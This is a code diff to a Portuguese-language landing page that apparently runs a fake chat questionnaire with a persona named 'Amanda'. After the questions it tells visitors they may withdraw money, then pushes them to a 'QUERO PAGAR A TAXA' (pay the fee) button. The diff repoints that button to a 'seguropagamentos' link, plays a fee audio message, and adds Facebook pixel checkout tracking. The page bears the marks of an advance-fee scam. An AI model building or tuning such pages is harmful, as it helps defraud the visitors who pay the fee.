@@ -17,6 +17,7 @@
     'https://connect.facebook.net/en_US/fbevents.js');
     fbq('init', '1520663849512203');
     fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
     </script>
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=1520663849512203&ev=PageView&noscript=1"
@@ -556,7 +557,7 @@
 const AVATAR_SRC = 'assets/amanda-B5Hvg7AS.jpg';
 const AVATAR_FALLBACK = 'https://i.pravatar.cc/150?img=47';
 const VIDEO_ID = '69ff5b9c9c0c7d2462e88151';
-const CTA_HREF = 'https://go.perfectpay.com.br/PPU38CQBCMU';
+const CTA_HREF = 'https://seguropagamentos.com.br/YOUTUBESUPORTE';
 const VIDEO_CTA_MS = 780 * 1000; // 13 min
 const LS_KEY_CTA_STARTED = 'questionario_cta_video_started_at';
 
@@ -634,7 +635,8 @@ const STEPS = [
 
 const FINAL_MSGS = [
     'Parabéns você completou todas as perguntas com sucesso! 😍',
-    'Clique no botão abaixo para realizar o seu saque'
+    'Clique no botão abaixo para realizar o seu saque',
+    'audio:sounds/audio-taxa.opus'
 ];
 
 // ===== HELPERS =====
@@ -806,8 +808,9 @@ async function showFinalCTA() {
 
     for (const msg of FINAL_MSGS) {
         await sleep(600);
-        showTyping(false);
-        const delay = 1800 + Math.min(msg.length * 55, 3000);
+        const isAudio = msg.startsWith('audio:');
+        showTyping(isAudio);
+        const delay = isAudio ? 2500 : 1800 + Math.min(msg.length * 55, 3000);
         await sleep(delay);
         removeTyping();
         statusText.textContent = 'online';
@@ -820,12 +823,16 @@ async function showFinalCTA() {
     const cta = document.createElement('div');
     cta.className = 'cta-area';
     cta.innerHTML = `
-        <audio controls src="sounds/audio-taxa.opus" class="cta-audio"></audio>
         <a href="${CTA_HREF}" target="_blank" rel="noopener noreferrer" class="cta-btn">
             QUERO PAGAR A TAXA
         </a>
     `;
     chatInner.appendChild(cta);
+    
+    // Dispara o evento InitiateCheckout
+    if (typeof fbq === 'function') {
+        fbq('track', 'InitiateCheckout');
+    }
 
     // Scroll múltiplo para garantir
     scrollToBottom();
